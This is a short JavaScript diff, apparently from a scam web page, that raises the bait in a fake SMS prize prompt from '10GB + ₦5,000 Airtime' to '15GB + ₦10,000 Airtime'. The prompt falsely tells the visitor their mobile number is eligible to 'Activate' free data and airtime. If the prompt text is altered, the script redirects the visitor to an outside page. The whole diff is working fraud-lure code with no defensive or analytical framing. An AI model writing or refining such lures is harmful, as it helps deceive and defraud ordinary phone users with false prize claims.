@@ -1,5 +1,5 @@
-var password = '10GB + ₦5,000 Airtime'
-password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + ₦5,000 Airtime, click OK to Activate now','10GB + ₦5,000 Airtime');
-if (password != '10GB + ₦5,000 Airtime') {
+var password = '15GB + ₦10,000 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 15GB + ₦10,000 Airtime, click OK to Activate now','15GB + ₦10,000 Airtime');
+if (password != '15GB + ₦10,000 Airtime') {
 location.href='https://gbamz.com/chioma.html';
 }
